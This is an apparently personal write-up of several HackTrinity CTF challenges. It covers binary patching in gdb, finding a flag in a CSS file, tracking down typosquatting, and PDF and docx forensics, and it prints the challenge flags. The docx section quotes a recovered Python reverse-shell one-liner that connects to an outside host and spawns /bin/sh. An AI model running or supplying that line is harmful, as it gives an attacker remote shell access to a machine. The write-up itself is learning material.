OutThis was the first of the so-called real challenges. You were presented with a simple binary that when ran produced the following output:As is customary my first thought was to test for a buffer overflow vulnerability by filling the input with a large amount of letters, but alas this did not cause any problems as I had hoped. (Little did I know I made a small mistake here that I wouldn’t notice until after the competition had concluded)I knew the flag was likely in the binary and so my next idea was to simply try the “strings” command and grep for “HackTrinity” but once again this produced nothing. It seemed the flag was encrypted somehow within the binary. Finally I decided it was time to open up the binary in a disassembler for which I chose gdb as it was already installed on my ubuntu vm. After disassembling main I immediately noticed some functions which had proper names retrieved from the binary, most notably “enc_password”, “decrypt”, “print_flag” and “strcmp”. Taking a look at the instruction calls it became clear that the binary encrypts the password taken in and then compares it against a decrypted password using the string compare function in C.My first thought was to somehow just modify the jump instruction at “0x0000000040001475” to always jump no matter the result of the string compare but after a bit of research this turned out to not be as easy as I thought it would be. I discovered that a jump instruction in x86 is encoded based on the offset it wishes to jump to and this made creating a new jump instruction a bit more difficult then I intended, however I would have likely tried had my next idea not worked out.Instead I chose to look into how the strcmp function worked in C by visiting its man page. As can be seen below it returns zero when the strings match.After a little bit more research I discovered that the “test eax,eax” instruction after the strcmp function in the disassembled main is in fact where the program checks the result of strcmp. Thus I simply had to set a breakpoint at that instruction, modify eax to 0 and then continue. (Note that rax is eax on 64bit systems)Bam! We have the flag: Flag: HackTrinity{h0w_cou1d_y0u_th3y_trusted_y0u}As for the mistake I mentioned above, I later realised that the binary did infact have a buffer overflow vulnerability. It just happened to have a large-ish buffer of 256 characters so I never realised it. This knowledge would have allowed me to solve the next challenge in this cateogry, Locked Out 2, easily enough as well.Web - CasualThis challenge brings you to a website which has a simple browser version of the popular game 2048. The first thing I made sure to do, after quickly glancing around the website, was to open up the chrome developer console and check out the website’s source. I spent quite a while searching around the javascript source code for the game for any potential clues as to the direction of the flag. I was thinking all I had to do was cheat the game and win and the flag would be revealed but I found nothing to indicate this was the case. After a frustrating amount of time searching, which was entirely my fault, I eventually found the flag commented out on the very last line of the “main.css” file. In hindsight I should have just tried searching every file for the keyword “HackTrinity” at the very beginning. Flag: HackTrinity{y0u_hav3_to_se4rch_f0r_it}Recon - CopyCatsThis question asked for the handle of a fake Hack Trinity phishing page that someone set up for the 2019 competition to try and steal the flags for that year’s challenges (the flag was in non standard format). I didn’t participate in the 2019 competition so I would not have known the answer to this from the time. My initial thought was to head on over to the Hack Trinity twitter page and scroll all the way back to last year in search of a potential tweet about the phishing site. Sadly, I was unable to find anything of value after quite a bit of searching.I reasoned I should probably take a much broader approach and began by googling types of phishing attacks. I quickly came to know the idea of typosquatting. This is when a person registers a url with a very slight difference to the real url of a website and tries to use it to fool a user into believing it is said website. This is an attack I already knew of but had never heard the name. After some more quick google searching I came across this tool called dnstwist which would scan for many potential typosquatted versions of a websites url. Upon installing and running it the results came back positive:As can be seen the tool detected a single registered typosquatted version of the Hack Trinity domain. I was sure I had my flag and so I copied the domain name and threw it into the flag box only to receive:I was baffled. I was sure I had the right answer but alas this was not the case. After a little more mindless attempts to make sure I had not made some silly mistake I ultimtely gave up and moved on to other challenges. It was not until the next day that I gave this challenge a go again. With a fresh start I decided to recheck the Hack Trinity twitter page for any clues I may have missed the previous day. This time however I made sure to scroll through their replies to tweets as well. Here I found a reply they made to a tweet referencing a fake Hack Trinity twitter page that was created to try and steal some of the flags from people. Suddenly I realised my major mistake. I had assumed that the challenge was looking for a phishing website but in fact it had asked for their handle, the twitter handle of this fake twitter page. Flag: @HackTrinity19Forensics - PanicThis challenge gave you minimal information and a simple file called “bread.pdf”. Upon opening it there is only one page with a picture of the empty bread isles in supermarkets due to coronavirus which I thought was a good homage to the current virus that shall not be named situation. I never really had any experience with the pdf format as a whole and so I began by searching for pdf virus analysis blogs online where I thought maybe some security researchers would make their own write ups on malicious pdf documents. My time spent searching led me to a tool called peepdf which is great for browsing the structure of a pdf document. After opening up “bread.pdf” in peepdf it gave me some information about the file such as the number of objects. It even helpfully labelled a suspicious element in object 8, however sadly there were no suspicious javascript elements as I had hoped there would be.I was quick to open up this suspicious object using the object command but all I got back was some giberrish I didn’t know what to do with so before investigating that further I checked out every other object as well. Ultimately I only found one other object of note which was object 2 as it also had some gibberish hidden within it.I noted that the object 2 data was labelled as flate decode which I had heard of before as a compression algorithm. After a bit of messing around I realised the data is already decompressed as I was using the “object” command instead of “rawobject”. The data still looked like gibberish to me though so I decided to start looking up some snippets of the string. A search online for “/Im4 Do Q” led me to realise ths data was in fact encoded text. As it turns out PDF’s have their own way of encoding text into a document. I began researching this encoding to see if I could write a simple program to reverse it but after a bit of reading it became clear that such a task would not be so easy. After a little while of deliberating I realised I could probably use someone else’s tool to extract the strings from a pdf document. After finding this website it gave me the flag. Flag: HackTrinity{th3_f1ag_supply_cha1ns_ar3_str0ng}(I ended up solving this in quite the roundabout way as you can see but hopefully it helped you learn something about the pdf file format)Forensics - Out of OfficeSimilar to “Panic” you were given a “hacked.docx” file and told to investigate it. It didn’t take me long to discover that a docx file can actually be unzipped by most decompression tools therefore I used 7zip and was greeted by a handful of files and folders.After some searching around I opened one of the xml files called “item1.xml” and found the following pastebin url:However after quickly copying it over to my browser it returned a page not found error? I was left stumped for a short while before thinking of a website I had used many a time in the past called the Wayback Machine which stores archived versions of webpages. Sure enough there was one snapshot saved of this pastebin url and bingo some code was hidden within:python - c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.3.3.7&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;#all the 1337 hackers have a signature right ? SGFja1RyaW5pdHl7QWxXQHk1X0MxM2FOX1VwX0BmdDNyX3kwdVJfSEBjazV9Cg ==From the looks of things it opens a reverse shell connection on port 1337 to your machine. I was wondering where to go from here and thought maybe I should listen for traffic on said port or something along those lines when I realised that there was no way this code ever ran as the pastebin url was invalid. That’s when I remembered the base64 encoded string at the bottom. When decoded it in fact returns the flag. Flag: HackTrinity{AlW@y5C13aN_Up@ft3r_y0uR_H@ck5}The EndThat’s it for all the challenges I was able to solve this time around! I attempted many others but never quie finished them, although I came quite close on some :( . Ultimately I ended up placing 52nd which I’m pretty happy with although I definitely think I can do better in next year’s. I hope this write up was informative in some way or atleast will inspire others to try out CTFs as they really are quite a lot of fun. One problem I have is a feeling this write up wasn’t worded overly well and comes across as some kind of first person report rather then a fun read, therefore I vow to come back and try fix that some time in the future. I hope you enjoyed and thanks for reading :D" } ]
